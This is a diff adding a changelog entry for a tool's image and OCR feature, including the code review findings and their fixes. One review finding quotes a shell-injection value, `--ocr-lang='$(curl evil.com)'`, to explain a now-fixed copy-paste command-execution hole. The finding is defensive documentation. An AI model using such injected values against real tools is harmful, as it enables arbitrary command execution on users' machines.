@@ -4,6 +4,58 @@ All notable changes to the BSA Plugin Family. Format follows [Keep a Changelog](
 
 Canon policy version (orthogonal measurement): `<semver>+hash:<sha256-prefix>`, computed from policy state (see [governance/immutable_invariants.md](governance/immutable_invariants.md) and Sprint 3 canon hash scheme).
 
+## [v1.4.7] — 2026-04-30
+
+**Feature: `bsa materials` image + OCR support (rec #3 Phase 3 / final).**
+
+Closes the **third and final half** of lifecycle review **rec #3** (broaden source-format coverage). Image evidence is a primary BSA source class — UI screenshots, whiteboard photos, scanned-but-not-OCR'd diagrams — and pre-v1.4.7 operators had to manually transcribe OR pre-OCR externally before staging.
+
+**Tag target**: this commit. **Canon policy version**: unchanged at `1.4.0+hash:5938f3d3`.
+
+### Added
+
+- **`_convert_image(path, *, ocr_enabled, ocr_lang)`** in `scripts/_bsa_cli_materials.py` — two-mode design:
+  - **default (no `--ocr`)**: Pillow reads metadata (Format, Dimensions, Bytes); body is metadata-only + a placeholder pointing at the `--ocr` flag. The image is still REGISTERED in the manifest as evidence — analyst can manually inspect OR re-stage with `--restage-changed --ocr` later (v1.4.4 synergy).
+  - **`--ocr` flag**: invokes pytesseract → tesseract binary on the image; text appended under `## OCR` H2 with the language tag. Empty-result case yields a placeholder noting tesseract returned no glyphs.
+  - Pillow soft-imported (degrades to bytes-only metadata if missing); pytesseract + tesseract binary required ONLY when `--ocr` is set (raises `ConversionUnavailable` with explicit install hints — `brew install tesseract` / `apt-get install tesseract-ocr` — when missing).
+- **Extension map**: `.png`, `.jpg`, `.jpeg`, `.tiff`, `.tif` → `image` kind. Anything else still falls under existing handlers (.gif/.bmp/.webp deferred — not in rec #3 scope, low BSA-evidence frequency).
+- **`SourceType=screenshot`** — new distinct evidence class for image kind. Recognized by all three SourceType heuristics: `_render_draft_manifest`, `_recreate_manifest`, `_upsert_draft_manifest` restage path.
+- **`--ocr`** CLI flag on `bsa materials` — opt-in OCR (default off because tesseract is system-level).
+- **`--ocr-lang=<code>`** CLI flag — tesseract language pack (default `eng`). Accepts `+`-separated combos (e.g. `eng+rus`).
+- **11 new tests** in `tests/test_bsa_cli_materials_image_ocr.py`: extension map, metadata-only mode (PNG + JPEG), OCR text extraction, lang threading, ConversionUnavailable when pytesseract missing, ConversionFailed on corrupted image, CLI dry-run IMG count, CLI commit metadata-only + SourceType=screenshot, CLI commit with OCR + extracted text, suggested-next preserves --ocr / --ocr-lang.
+
+### Changed
+
+- **`_convert_one`** signature gains `ocr_enabled: bool = False` + `ocr_lang: str = "eng"` kwargs; dispatch routes `image` kind to `_convert_image` with these threaded through.
+- **`_count_kinds`** preview adds `IMG:` label.
+- **`_recreate_manifest`** known-kinds whitelist includes `image`.
+- **`cmd_materials`** writer loop reads `args.ocr` + `args.ocr_lang` and threads through `_convert_one`.
+- **Dry-run "Suggested next"** preserves `--ocr` and (when non-default) `--ocr-lang=<code>`.
+- **`bsa materials` subcommand help** lists all 18 supported extensions (was 13).
+- **One existing test** (`test_materials_unsupported_files_reported_separately`) updated: png moved into supported set; test now uses `.exe` + `.iso` to cover the unsupported-fallback contract.
+
+### Tests
+
+Total suite: **2196 passed** (was 2180 in v1.4.6 — +16 net new: 11 base coverage + 4 R1-fix verification + 1 R2-fix verification; one existing test updated).
+
+### Codex Review
+
+- **R1**: REQUEST CHANGES — 3 MAJOR + 1 MINOR. All 4 fixed:
+  - **MAJOR #1** (`--restage-changed --ocr` no-op for unchanged images): the planner short-circuited on hash-match BEFORE OCR intent reached the writer. The documented `bsa materials <src> --commit --restage-changed --ocr` workflow (backfill OCR text after installing tesseract) was a no-op for unchanged image bytes. Fix: thread `ocr_enabled` into `_plan_conversions`; when restage_changed AND ocr_enabled AND existing staged body contains the "OCR not run" placeholder → force restage even with matching hash. Falls through to the existing in-place row replacement path (preserves SourceID + slug + operator-curated cells).
+  - **MAJOR #2** (multi-page TIFF lost N-1 pages): OCR ran only on the first frame; metadata reported only `img.size` for that frame. A scanned 50-page bundle silently lost 49 pages of evidence. Fix: read `img.n_frames`; emit `**Pages**: N` in metadata when > 1; iterate via `img.seek()` and OCR each frame under `### Page N` headers.
+  - **MAJOR #3** (suggested-next not shell-quoted): `bsa materials --ocr-lang='$(curl evil.com)'` printed back as `--ocr-lang=$(curl evil.com)` in the suggested-next command, executable on copy-paste. Plus operator-supplied paths (workspace + src_dir) with spaces broke command parsing. Two-layer fix: (a) `_convert_image` validates `ocr_lang` against `^[a-z0-9_+]+$` regex (rejects shell metachars at extractor entry); (b) suggested-next emits all operator-supplied tokens via `shlex.quote` (paths + lang value). Defense in depth.
+  - **MINOR** (DecompressionBombWarning slipped through): Pillow has a 2-tier guard — `MAX_IMAGE_PIXELS` triggers `DecompressionBombWarning` (non-fatal); `MAX_IMAGE_PIXELS * 2` triggers `DecompressionBombError` (fatal). v1.4.7 caught only the error. Fix: `warnings.catch_warnings()` + `simplefilter("error", DecompressionBombWarning)` in the metadata read path so a 100-MP attack image surfaces as `ConversionFailed` rather than slipping through to OCR.
+- **4 new tests** for R1 fixes:
+  * test_restage_changed_with_ocr_backfills_metadata_only_image (MAJOR #1)
+  * test_convert_image_multipage_tiff_ocrs_each_page (MAJOR #2)
+  * test_convert_image_ocr_lang_validation_rejects_shell_metachars (MAJOR #3 — extractor-layer)
+  * test_dry_run_suggested_next_quotes_ocr_lang (MAJOR #3 — suggested-next layer; uses src dir with spaces)
+- **R2**: REQUEST CHANGES — 1 NEW MAJOR exposed by the R1 #1 fix. Fixed:
+  - **NEW MAJOR**: the R1 #1 backfill detection only checked for `"OCR not run"` (metadata-only stage). When operator re-staged with `--ocr-lang=rus` after an `eng` stage, the `"lang="` branch had a `pass` (with a comment "we don't know the requested lang here") — so the lang switch silently kept the old `eng` text. Fix: thread `ocr_lang: str = "eng"` through `_plan_conversions`; cmd_materials passes `getattr(args, "ocr_lang", "eng")`; the lang-detection branch now compares existing `lang=...` vs requested `ocr_lang` and sets `ocr_backfill_needed=True` on mismatch.
+- **1 new test** for R2 fix:
+  * test_restage_changed_with_ocr_lang_switch_forces_reextract (NEW MAJOR — verifies eng → eng+osd lang switch triggers re-extract)
+- **R3**: APPROVE — R2 fix verified, no new issues. Same-lang case correctly skips (inequality compare); metadata-only backfill takes precedence over lang-switch (`"OCR not run"` checked first); `eng+rus` vs `rus+eng` ordering is a future normalization concern (acceptable as redundant re-extract, not a correctness bug).
+
 ## [v1.4.6] — 2026-04-30
 
 **Feature: `bsa materials` eml + msg support (Phase 2 of rec #3 — email evidence).**
